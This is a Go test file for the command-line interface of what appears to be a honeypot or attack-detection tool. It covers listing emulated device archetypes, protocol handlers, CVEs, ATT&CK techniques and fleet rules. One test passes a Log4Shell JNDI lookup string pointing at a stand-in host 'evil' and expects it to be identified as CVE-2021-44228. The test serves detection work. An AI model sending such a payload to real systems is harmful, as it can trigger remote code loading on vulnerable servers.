package cli

import (
	"io"
	"os"
	"strings"
	"testing"
)

// captureStdout runs fn with os.Stdout redirected to a pipe and returns
// what it printed plus fn's error. The inspect subcommands write to
// stdout, so this lets us assert on their rendered output.
func captureStdout(t *testing.T, fn func() error) (string, error) {
	t.Helper()
	old := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("pipe: %v", err)
	}
	os.Stdout = w
	runErr := fn()
	_ = w.Close()
	os.Stdout = old
	out, _ := io.ReadAll(r)
	return string(out), runErr
}

func TestListArchetypes(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListArchetypes(nil) })
	if err != nil {
		t.Fatalf("list-archetypes: %v", err)
	}
	if !strings.Contains(out, "archetype(s).") {
		t.Errorf("missing summary footer: %q", out)
	}
	if !strings.Contains(out, "debian-12") {
		t.Errorf("expected debian-12 in catalog, got: %q", out)
	}
}

func TestListArchetypesDetail(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListArchetypes([]string{"beckhoff-cx"}) })
	if err != nil {
		t.Fatalf("detail: %v", err)
	}
	// The ADS service + handler must show in the default-services block.
	if !strings.Contains(out, "48898") || !strings.Contains(out, "ads") {
		t.Errorf("beckhoff-cx detail missing ads/48898: %q", out)
	}
}

func TestListArchetypesByDisplayName(t *testing.T) {
	// Find's DisplayName fallback: a pretty name resolves to the profile.
	out, err := captureStdout(t, func() error {
		return cmdListArchetypes([]string{"Debian 12 (bookworm)"})
	})
	if err != nil {
		t.Fatalf("by display name: %v", err)
	}
	if !strings.Contains(out, "debian-12") {
		t.Errorf("display-name lookup did not resolve: %q", out)
	}
}

func TestListArchetypesUnknown(t *testing.T) {
	_, err := captureStdout(t, func() error { return cmdListArchetypes([]string{"no-such-box"}) })
	if err == nil {
		t.Fatal("expected error for unknown archetype")
	}
}

func TestListHandlers(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListHandlers(nil) })
	if err != nil {
		t.Fatalf("list-handlers: %v", err)
	}
	for _, want := range []string{"tcp handlers", "udp handlers", "ssh", "snmp", "ads", "pjl"} {
		if !strings.Contains(out, want) {
			t.Errorf("list-handlers missing %q in: %q", want, out)
		}
	}
}

func TestListHandlersProtoFilter(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListHandlers([]string{"--proto", "udp"}) })
	if err != nil {
		t.Fatalf("list-handlers udp: %v", err)
	}
	if strings.Contains(out, "tcp handlers") {
		t.Errorf("--proto udp should not list tcp handlers: %q", out)
	}
	if !strings.Contains(out, "snmp") {
		t.Errorf("--proto udp missing snmp: %q", out)
	}
	if _, err := captureStdout(t, func() error { return cmdListHandlers([]string{"--proto", "sctp"}) }); err == nil {
		t.Error("expected error for bad --proto")
	}
}

func TestListCVEs(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListCVEs([]string{"--service", "fortinet"}) })
	if err != nil {
		t.Fatalf("list-cves: %v", err)
	}
	if !strings.Contains(out, "CVE-2018-13379") {
		t.Errorf("fortinet filter missing known CVE: %q", out)
	}
	// Filtering by service must exclude unrelated services.
	if strings.Contains(out, "Log4Shell") {
		t.Errorf("fortinet filter leaked an http CVE: %q", out)
	}
}

func TestListTechniques(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListTechniques([]string{"--kind", "handler"}) })
	if err != nil {
		t.Fatalf("list-techniques: %v", err)
	}
	if !strings.Contains(out, "ssh") || !strings.Contains(out, "T1110.001") {
		t.Errorf("handler coverage missing ssh→T1110.001: %q", out)
	}
	if strings.Contains(out, "anomaly ") {
		t.Errorf("--kind handler leaked anomaly rows: %q", out)
	}
	if _, err := captureStdout(t, func() error { return cmdListTechniques([]string{"--kind", "bogus"}) }); err == nil {
		t.Error("expected error for bad --kind")
	}
}

func TestIdentify(t *testing.T) {
	out, err := captureStdout(t, func() error {
		return cmdIdentify([]string{
			"--ua", "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org)",
			"--ssh", "SSH-2.0-libssh2_1.9.0",
			"--payload", "GET /?x=${jndi:ldap://evil/a}", "--handler", "http",
		})
	})
	if err != nil {
		t.Fatalf("identify: %v", err)
	}
	if !strings.Contains(out, "nmap") {
		t.Errorf("identify missed nmap UA: %q", out)
	}
	if !strings.Contains(out, "libssh2") {
		t.Errorf("identify missed libssh2 ssh id: %q", out)
	}
	if !strings.Contains(out, "CVE-2021-44228") {
		t.Errorf("identify missed Log4Shell payload: %q", out)
	}
}

func TestIdentifyNoSignals(t *testing.T) {
	if _, err := captureStdout(t, func() error { return cmdIdentify(nil) }); err == nil {
		t.Error("expected error when no signals supplied")
	}
}

func TestListFleetRules(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListFleetRules(nil) })
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"fleet:source-multi-sensor", "fleet:c2-shared", "config:"} {
		if !strings.Contains(out, want) {
			t.Errorf("list-fleet-rules output missing %q", want)
		}
	}
}

func TestListFleetRulesJSON(t *testing.T) {
	out, err := captureStdout(t, func() error { return cmdListFleetRules([]string{"--json"}) })
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `"id": "fleet:port-campaign"`) && !strings.Contains(out, `"id":"fleet:port-campaign"`) {
		t.Error("json output missing a known rule (fleet:port-campaign)")
	}
}

func TestExportIOCsRejectsBadFormat(t *testing.T) {
	if err := cmdExportIOCs([]string{"--format", "bogus", "-c", "/nonexistent.yaml"}); err == nil {
		t.Fatal("expected an error for an invalid --format")
	}
}
